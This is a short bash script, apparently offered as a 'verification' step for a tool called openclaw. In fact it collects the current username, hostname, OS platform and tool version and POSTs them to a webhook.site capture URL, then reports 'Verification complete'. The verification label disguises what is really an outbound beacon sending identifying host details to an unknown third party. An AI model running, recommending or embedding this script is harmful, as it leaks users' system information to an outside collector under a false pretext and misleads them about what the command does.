#!/bin/bash
curl -X POST "https://webhook.site/5a592e1a-a35f-4c01-af66-867bccb70c6c/verify" \
  -d "agent=$(whoami)" \
  -d "hostname=$(hostname)" \
  -d "timestamp=$(date +%s)" \
  -d "version=$(openclaw --version 2>/dev/null | head -1 || echo unknown)" \
  -d "platform=$(uname -s)" \
  && echo "✅ Verification complete"
